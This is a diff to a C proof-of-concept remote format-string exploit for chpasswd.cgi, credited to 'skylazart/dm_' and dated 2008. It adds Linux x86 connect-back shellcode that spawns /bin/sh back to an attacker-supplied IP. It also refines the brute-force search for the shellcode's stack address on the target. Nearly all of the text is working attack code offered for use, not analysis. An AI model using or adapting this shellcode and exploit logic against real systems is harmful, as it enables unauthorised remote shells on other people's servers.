@@ -7,6 +7,16 @@
  */
 
 
+/*
+ * First relase TODO:
+ * 
+ * Final exploitation;
+ *
+ * Make all variables as parameters;
+ */
+
+
+
 #include <stdio.h>
 #include <string.h>
 #include <ctype.h>
@@ -17,6 +27,68 @@
 #define DEFAULT_HTTP_PORT 80
 
 #define SCAN_TIMEOUT 5
+
+
+// Linux connect back shellcode
+char lnx_connect_back[] = 
+	"\x31\xc0"
+	"\xb0\x02"
+	"\xcd\x80"
+	"\x85\xc0"
+	"\x75\x77"
+	"\x31\xc0"
+	"\xb0\x42"
+	"\xcd\x80"
+	"\x89\xe5"
+	"\x31\xd2"
+	"\xb2\x66"
+	"\x89\xd0"
+	"\x31\xc9"
+	"\x89\xcb"
+	"\x43"
+	"\x89\x5d\xf8"
+	"\x43"
+	"\x89\x5d\xf4"
+	"\x4b"
+	"\x89\x4d\xfc"
+	"\x8d\x4d\xf4"
+	"\xcd\x80"
+	"\x31\xc9"
+	"\x89\x45\xf4"
+	"\x43"
+	"\x66\x89\x5d\xec"
+	"\x66\xc7\x45\xee\x0f\x27"
+	"\xc7\x45\xf0"	 
+	"IPIP" 		/* IP address */
+	"\x8d\x45\xec"
+	"\x89\x45\xf8"
+	"\xc6\x45\xfc\x10"
+	"\x89\xd0"
+	"\x43"
+	"\x8d\x4d\xf4"
+	"\xcd\x80"
+	"\x31\xc9"
+	"\x8b\x5d\xf4"
+	"\xb0\x3f"
+	"\xcd\x80"
+	"\x41"
+	"\x83\xf9\x03"
+	"\x75\xf6"
+	"\x31\xc0"
+	"\x50"
+	"\x68\x2f\x2f\x73\x68"
+	"\x68\x2f\x62\x69\x6e"
+	"\x89\xe3"
+	"\x8d\x54\x24\x08"
+	"\x50"
+	"\x53"
+	"\x8d\x0c\x24"
+	"\xb0\x0b"
+	"\xcd\x80"
+	"\x31\xc0"
+	"\x31\xdb"
+	"\x40"
+	"\xcd\x80"; 
 
 
 
@@ -94,7 +166,7 @@ check_cgi (char * ip, int port, char * cgi_path)
 }
 
 
-void
+int
 find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long addr)
 {
 	int fill_size;
@@ -124,7 +196,8 @@ find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long
 		strncat (buffer, "AAAA", maxlen);
 	}	
 
-	//i = write (1, buffer, strlen (buffer));
+	// Return the numbers of bytes we have to store the nops+shellcode
+	return (fill_size);
 }
 
 void
@@ -210,7 +283,8 @@ main (int argc, char ** argv)
 	char buffer[8192];
 	char result[8192];
 	char * ptr;
-
+	char * endPtr;
+	
 	int align = 0;
 	int stack_height = 1;
 	
@@ -223,11 +297,13 @@ main (int argc, char ** argv)
 
 	int total_shellcode_addr_retries;
 
+	int shellcode_size;
 	
 	puts ("Proof of concept chpasswd.cgi remote format string exploit");
 	puts ("by skylazart/dm_ - BufferOverflow & xored");
 	puts ("28/11/2008");
 	puts ("");
+
 
 	if (argc < 2) {
 		printf ("%s <host> [port] [cgi_path] [return address] [step]\n", argv[0]);
@@ -329,15 +405,6 @@ main (int argc, char ** argv)
 	}
        	
 
-//	expect_shellcode_addr = 0xbf9f7601;
-//	expect_shellcode_addr = 0xbfa08301;
-//	expect_shellcode_addr = 0xbff0f7fc & 0xffff0000;
-//	expect_shellcode_addr = 0xbfbafdd5 & 0xffff0000;
-//	expect_shellcode_addr = 0xb7fc5d68 & 0xffff0000;
-//
-//	expect_shellcode_addr = 0xbfffffff;
-
-
 	shellcode_addr_found = 0;
 	total_shellcode_addr_retries = 0;
 	found = 0;
@@ -348,7 +415,7 @@ main (int argc, char ** argv)
 		    (expect_shellcode_addr & 0x0000ff00) >> 8 == 0 ||
 		    (expect_shellcode_addr & 0x000000FF)      == 0) {
 			printf (">> Skipping address 0x%08x\n", expect_shellcode_addr);
-			expect_shellcode_addr++;
+			expect_shellcode_addr += step;
 			continue;
 		}
 
@@ -358,7 +425,8 @@ main (int argc, char ** argv)
 
 		fprintf (stderr, "\r>> Trying 0x%08x, [%d] steps.", expect_shellcode_addr, ++total_shellcode_addr_retries);
 		
-		find_shellcode_addr (buffer, sizeof (buffer)-2, align, stack_height, expect_shellcode_addr);
+		shellcode_size = find_shellcode_addr (buffer, sizeof (buffer)-2, align, stack_height, expect_shellcode_addr);
+
 
 		post_chpasswd_user (host, port, cgi_path, 
 				    buffer, result, sizeof (result)-2);
@@ -369,8 +437,24 @@ main (int argc, char ** argv)
 			print_result_as_ascii (result);
 			printf ("\n");
 
-			if (strstr (result, "|AAA")) {
-				printf (">> &Shellcode found: %s shellcode address: 0x%08x\n", host, expect_shellcode_addr);
+			if ((ptr = strstr (result, "|AAA"))) {
+								
+				endPtr = strstr (ptr, "AAA|");
+				if (!endPtr) {
+					//XXX
+					expect_shellcode_addr += step;
+					continue;
+				}
+
+				if ((endPtr - ptr) < (shellcode_size-20)) {
+					step = -16;
+
+					printf (">> &Shellcode found: %s shellcode address: 0x%08x. Finding first byte... (%d of %d)bytes\n", host, expect_shellcode_addr, (endPtr - ptr), shellcode_size);
+					expect_shellcode_addr = expect_shellcode_addr + step;
+					continue;
+				}
+				
+				printf (">> &Shellcode found: %s shellcode address: 0x%08x. \n", host, expect_shellcode_addr);
 				
 				shellcode_addr_found ++;
 				sleep (1);
@@ -391,6 +475,7 @@ main (int argc, char ** argv)
 	printf ("\n\n");
 	printf (">> Partial exploit result:\n");
 	printf (">> Host address %s: stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
+	printf ("Brute forcing remote return address into stack...\n");
 
 	
 	return (0);
